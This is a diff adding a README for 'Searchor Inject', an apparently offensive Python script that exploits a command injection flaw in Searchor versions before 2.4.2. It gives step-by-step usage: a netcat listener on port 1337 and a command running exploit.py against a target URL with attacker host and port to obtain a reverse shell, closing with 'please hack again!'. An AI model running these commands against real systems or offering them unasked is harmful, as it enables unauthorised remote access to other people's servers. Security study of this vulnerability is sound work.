@@ -1,0 +1,24 @@
+Searchor Inject is a simple python3 script developed to exploit the command injection vulnerability found in Searchor < 2.4.2.
+
+This script was developed by v0rt3chs and was inspired by the bash script created by nikn0laty found here: https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
+
+To use Searchor Inject, ensure that you have python3 installed. Then create a listener for your reverse shell. I use netcat:
+
+nc -nvlp 1337
+
+
+
+Then use the exploit.py script to run the exploit and receive a reverse shell:
+
+python3 exploit.py <http://target.url/> <LHOST> <LPORT>
+
+EX:
+python3 exploit.py http://vulnerable-site.url/search 10.10.10.10 1337
+
+
+
+ASCII art is credit to:
+@patorjk
+https://patorjk.com/software/taag
+
+Thanks for exploiting with us, please hack again!
